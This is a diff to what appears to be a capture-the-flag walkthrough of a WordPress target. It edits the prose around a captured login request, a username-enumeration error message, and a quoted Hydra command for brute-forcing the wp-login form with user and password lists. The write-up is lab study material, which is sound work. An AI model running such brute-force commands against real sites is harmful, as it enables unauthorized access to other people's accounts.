@@ -102,19 +102,19 @@ POST /retro/wp-login.php HTTP/1.1
 log=Wade&pwd=brrr&wp-submit=Log+In&redirect_to=%2Fretro%2Fwp-admin%2F&testcookie=1
 ```
 
-As the POST request. Also, very interesting - look at the error message!
+As the POST request. Also, we are on the right track - look at the error message!
 
-![](https://i.imgur.com/uHZ4R3z.png)
+![Correct username, showing error on password](https://i.imgur.com/uHZ4R3z.png)
 
 Now we'll do Hydra goes brrr.
 
+### 1.4 Bruteforcing
 From https://github.com/gnebbia/hydra_notes, I found the following,
-```
-hydra -L lists/usrname.txt -P lists/pass.txt localhost -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
-# now we check for success by using S=Location, since wordpress uses a Location
-# header to redirect the user, we can think about S as a sort of grep applied to
-# the HTTP response
-```
+> hydra -L lists/usrname.txt -P lists/pass.txt localhost -V http-form-post '/wp- login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
+> # now we check for success by using S=Location, since wordpress uses a Location
+> # header to redirect the user, we can think about S as a sort of grep applied to
+> # the HTTP response
+
 
 Our command thus becomes 
 ```
